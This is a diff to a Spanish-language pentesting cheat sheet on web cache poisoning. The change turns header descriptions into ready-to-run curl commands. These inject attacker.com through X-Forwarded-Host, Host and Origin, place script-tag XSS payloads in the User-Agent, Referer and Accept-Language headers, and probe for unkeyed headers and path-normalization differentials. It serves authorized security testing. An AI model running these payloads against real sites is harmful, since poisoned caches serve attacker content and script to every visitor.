@@ -24,42 +24,33 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `Host` | Cambiar Host → ¿response distinto pero MISMO cache key? | Vector clásico — apps con vhost routing. |
-| `X-Forwarded-Host` | Override Host backend-side | Comúnmente unkeyed + reflejado. |
-| `X-Forwarded-Scheme` / `X-Forwarded-Proto` | Force scheme http/https | Redirect injection. |
-| `X-Forwarded-Port` | Force port | URL building. |
-| `X-Original-Url` / `X-Rewrite-Url` | Path override interno | IIS-specific. |
-| `X-Forwarded-For` / `X-Real-IP` | IP override | Auth bypass. |
-| `Referer` | Reflejado en logs / pages | XSS via Referer. |
-| `User-Agent` | Reflejado en error pages | Cross-site UA reflection. |
-| `Accept-Language` | Reflejado en localized pages | i18n vector. |
-| `Cookie` | Solo SOME cookies en cache key — otras unkeyed | Hidden via per-config. |
-| `Origin` | CORS-related reflection | XSS via Origin. |
-| `X-Forwarded-Server` | Backend identification leak | Rare. |
-| `X-Host` | Custom Host override | Apps custom. |
-| `X-Override-URL` | Path rewriting | Edge. |
-| `X-HTTP-Method-Override` | Method override → distinct response | Combo vector. |
-| `Forwarded` | RFC 7239 forwarding | Modern std. |
-| Custom app headers | `X-API-Version`, `X-Tenant-ID`, etc | App-specific reflexion. |
+| `curl -H "X-Forwarded-Host: attacker.com" "https://target/?cb=$(date +%s)"` | Inyectar XFH unkeyed → cache stores response con XFH reflected | Vector más común. |
+| `curl -H "Host: attacker.com" "https://target/?cb=$(date +%s)"` | Direct Host header poison | Apps con vhost routing. |
+| `curl -H "X-Forwarded-Scheme: http" "https://target/?cb=$(date +%s)"` | Force scheme → redirect injection cached | URL building from scheme. |
+| `curl -H "X-Forwarded-Port: 1337" "https://target/?cb=$(date +%s)"` | Port injection en URL building | Reflected en `<base href>`. |
+| `curl -H "X-Original-URL: /admin" "https://target/?cb=$(date +%s)"` | Path override interno (IIS) | Backend processes admin via header. |
+| `curl -H "Origin: https://attacker.com" "https://target/?cb=$(date +%s)"` | Reflected Origin → XSS candidate | CORS reflection. |
+| `curl -H "User-Agent: <script>alert(1)</script>" "https://target/error?cb=$(date +%s)"` | UA reflejado en error pages cached | UA-reflection XSS. |
+| `curl -H "Referer: <script>alert(1)</script>" "https://target/?cb=$(date +%s)"` | Referer reflected cacheado | Referer-reflection XSS. |
+| `curl -H "Accept-Language: x-fake; <script>" "https://target/?cb=$(date +%s)"` | i18n reflection | Localized page reflection. |
+| `for h in 'X-Forwarded-Host' 'X-Forwarded-Scheme' 'X-Original-URL' 'X-Rewrite-URL' 'X-Forwarded-For' 'X-Real-IP' 'X-Host' 'X-Override-URL' 'X-HTTP-Method-Override' 'Forwarded'; do curl -sI -H "$h: probe" "https://target/?cb=$RANDOM" \| grep -iE 'x-cache\|age:'; done` | Bulk unkeyed header probe | Discovery automation. |
 ^wcp-unkeyed-headers
 
 ### Workflow para identificar unkeyed header
 
 ```bash
-# Setup baseline
 URL="https://target/page?cb=$(date +%s)"
 
-# 1. Sin header probado
-curl -sI "$URL" | grep -i x-cache
-curl -sI "$URL" | grep -i x-cache  # Hit confirma cache
+# Baseline (sin header)
+R1=$(curl -s "$URL")
+curl -sI "$URL" | grep -iE 'x-cache|age:'
 
-# 2. Mismo URL pero con header sospechoso
+# Con header sospechoso
 URL2="https://target/page?cb=$(date +%s)-2"
 curl -sI -H "X-Forwarded-Host: evil.com" "$URL2" | grep -i x-cache
 curl -sI "$URL2" | grep -i x-cache  # Sin el header
 
-# Si segundo request HIT con misma response del primero → header UNKEYED
-# (cambió response pero no cache key)
+# Si segundo request HIT con response del primero (con header) → header UNKEYED
 ```
 
 ___
@@ -68,36 +59,16 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Instalar | Burp → Extensions → BApp Store → "Param Miner" | Free Burp ext (PortSwigger). |
-| Right-click request → "Guess headers" | Detecta headers ocultos que afectan response | Single click. |
-| Right-click → "Guess params" | Detecta query params ocultos | Same idea. |
-| Settings → "Cache poisoning detection" | Toggle modo cache | Habilita probes específicos. |
-| Settings → "Force cache miss" | Aplica cache buster auto | Necesario para identificar. |
-| Wordlist default | Lista interna de 200+ headers comunes | Comprehensive. |
-| Custom wordlist | Settings → custom word file | Extender. |
-| Output panel | "Param Miner" tab muestra findings | Headers + params encontrados. |
-| Reflexion detection | Auto-marca headers que se reflejan | Pre-XSS hint. |
-| Settings → "Identify cache key" | Modo dedicado para mapear cache key | Pasivo. |
-| Settings → "Probe identifier" | Identificador único per probe | Tracking. |
-| Hosts list | Filtra solo target en scope | Scope discipline. |
+| Burp → Extensions → BApp Store → "Param Miner" → Install | Setup extension | Primera vez. |
+| Right-click cacheable request → "Guess headers" | Auto-discover headers ocultos que afectan response | Single click discovery. |
+| Right-click → "Guess params" | Discover hidden query/body params | Cache key analysis. |
+| Param Miner → Settings → "Force cache miss" → ON | Aplicar cache buster automáticamente | Necesario para fuzz. |
+| Param Miner → Settings → "Identify cache parameters" → ON | Modo dedicado mapeo cache key | Pre-attack. |
+| Param Miner → Settings → "Reflect to attack mode" → ON | Auto-marca headers reflejados | Pre-XSS hint. |
+| Param Miner → Settings → "Probe twice to confirm" → ON | Reduce false positives | Reliability. |
+| Param Miner → Output panel | Findings: reflected headers + unkeyed inputs | Post-scan review. |
+| Burp → BApp Store → "Reflection" → install | Highlight reflected inputs en historial | Pre-survey. |
 ^wcp-unkeyed-paramminer
-
-### Setup Param Miner workflow
-
-```
-1. Burp → Proxy → HTTP history
-2. Identificar request con response cacheable (Age > 0, Cache-Control public).
-3. Right-click → Guess headers
-4. Settings checked:
-   ☑ Force cache miss
-   ☑ Reflect to attack mode
-   ☑ Probe twice to confirm
-5. Run — Param Miner ejecuta 200+ probes
-6. Output panel revela:
-   - Headers reflejados → XSS candidate
-   - Headers que cambian response sin cache key → POISONING vector
-   - Params ocultos → SSRF / RCE candidates
-```
 
 ___
 
@@ -105,37 +76,31 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Trailing slash | `GET /admin/` vs `GET /admin` | Cache key per path string — backend normaliza ambos al mismo handler → cache poisoning. |
-| Doble slash | `GET //admin` o `GET /admin//` | Cache trata como distinto path — backend normaliza. |
-| Encoded slash | `GET /admin%2F` | Cache key includes encoded — backend decodes. |
-| Encoded chars en path | `/p%61ge` (= `/page`) | Same. |
-| Path traversal canonical | `/foo/../page` | Cache no normaliza → backend sí. |
-| Case sensitivity | `/Page` vs `/page` | Some caches case-sensitive, backends no (Windows/IIS). |
-| Query order | `?a=1&b=2` vs `?b=2&a=1` | Cache key string-based vs sorted. |
-| Duplicate params | `?a=1&a=2` | Cache key contiene exact, backend toma uno. |
-| Empty value | `?a=` vs `?a` | Cache key distinto, backend igual. |
-| Hash fragment | `#section` (NO sent al server) | NO afecta cache pero útil para client redirects. |
-| HTTP/1.0 vs 1.1 | Some caches segregan por version | Edge. |
-| HEAD vs GET | HEAD response cached as GET | Separate vectors. |
-| Method override | POST con `X-HTTP-Method-Override: GET` | Backend treats as GET, cache as POST. |
-| Webhook callback | App fetches URL → cached entonces | Indirect. |
+| `curl -sI "https://target/admin"` y `curl -sI "https://target/admin/"` | Compare cache HIT/MISS entre with/without trailing slash | Cache key path-string vs backend-normalized. |
+| `curl -sI "https://target//admin"` (doble slash) | Cache key distinto, backend normaliza | Path normalization differential. |
+| `curl -sI "https://target/admin%2F"` (encoded slash) | Cache stores encoded variant | Backend decodes. |
+| `curl -sI "https://target/p%61ge"` (encoded char) | Encoded path key | Decode-after-cache differential. |
+| `curl -sI "https://target/foo/../admin"` (path traversal canonical) | Cache stores raw, backend normaliza | Compound. |
+| `curl -sI "https://target/Admin"` y `curl -sI "https://target/admin"` | Case sensitivity differential | IIS / Windows backend. |
+| `curl -sI "https://target/?a=1&b=2"` y `curl -sI "https://target/?b=2&a=1"` | Query order differential | Cache string-based key. |
+| `curl -sI "https://target/?a=1&a=2"` | Duplicate param cache key | Backend HPP. |
+| `curl -X POST -H "X-HTTP-Method-Override: GET" "https://target/admin"` | Method override → backend GET, cache POST | Method differential. |
+| `curl -I "https://target/admin"` (HEAD) y comparar con `curl -sI "https://target/admin"` (GET) | HEAD response cached as GET | Method-based separate vectors. |
 ^wcp-unkeyed-normalization
 
 ### Path normalization probe
 
 ```bash
-# Backend normaliza /// a /
-# Cache trata cada uno distinto
-
 URL_BASE="https://target/admin"
 URL_DOUBLE="https://target//admin"
 URL_TRAILING="https://target/admin/"
 
-# Si todos return same content pero cache HIT distinto en cada:
 for u in "$URL_BASE" "$URL_DOUBLE" "$URL_TRAILING"; do
   echo "=== $u ==="
-  curl -sI "$u" | grep -iE 'x-cache|age'
+  curl -sI "$u" | grep -iE 'x-cache|age:'
 done
+
+# Si todos return same content pero distinct cache HIT → cache key differential
 ```
 
 ***
